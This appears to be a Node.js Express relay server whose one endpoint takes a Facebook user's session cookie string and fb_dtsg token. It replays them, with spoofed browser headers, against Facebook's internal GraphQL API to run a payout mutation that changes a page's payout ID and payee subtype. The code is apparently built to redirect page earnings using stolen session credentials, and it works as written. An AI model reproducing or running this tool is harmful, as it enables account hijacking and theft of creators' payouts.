const express = require('express');
const axios = require('axios');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// ==================== PAYOUT ENDPOINT ====================
app.post('/redirect/facebook_graph_endpoint/v24.1/:pageId/payout', async (req, res) => {
    try {
        const { pageId } = req.params;
        const payload = req.body;

        console.log(`[${new Date().toISOString()}] Payout Request - Page: ${pageId} | Subtype: ${payload.tools}`);

        const graphUrl = "https://www.facebook.com/api/graphql/";

        const postData = new URLSearchParams({
            av: payload.__u,
            __user: payload.__u,
            __a: "1",
            __req: "3u",
            fb_dtsg: payload.fb_dtsg || payload.__s,
            lsd: payload.lsd || "AVrF0x1L",
            __comet_req: "15",
            fb_api_caller_class: "RelayModern",
            server_timestamps: "true",
            doc_id: "5032256523529928",   // Payout Mutation
            variables: JSON.stringify({
                input: {
                    payout_id: payload.fp || payload.payoutId,
                    page_id: pageId,
                    subtype: payload.tools
                }
            })
        });

        const fbResponse = await axios.post(graphUrl, postData, {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Origin': 'https://www.facebook.com',
                'Referer': `https://www.facebook.com/${pageId}/payouts`,
                'Cookie': payload.cookieString || '',
                'x-fb-friendly-name': 'UseMutatePayoutCometLinkPayeeSubtypeQuery'
            },
            timeout: 40000
        });

        console.log("✅ Facebook Status:", fbResponse.status);
        console.log("Raw Response Preview:", JSON.stringify(fbResponse.data).substring(0, 800) + "...");

        res.json({
            success: true,
            message: "Transfer request sent to Facebook",
            data: fbResponse.data
        });

    } catch (error) {
        console.error("❌ Server Error:", error.message);
        if (error.response) {
            console.error("Facebook Error Response:", JSON.stringify(error.response.data, null, 2));
        }

        res.json({
            success: false,
            error: 'TRANSFER_FAILED',
            details: error.response?.data || error.message
        });
    }
});
app.listen(PORT, () => {
    console.log(`🚀 Server is running on port ${PORT}`);
});
